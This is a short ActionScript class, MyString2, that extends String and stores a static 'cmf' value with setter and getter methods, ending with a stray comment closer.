class MyString2 extends String
{
	static var cmf;
	function MyString2(a,b)
	{
		super();
	}
	
	static function setCMF(mycmf)
	{
		cmf = mycmf;
	}
	
	static function getCMF()
	{
		return (MyString2.cmf);
	}
}


*/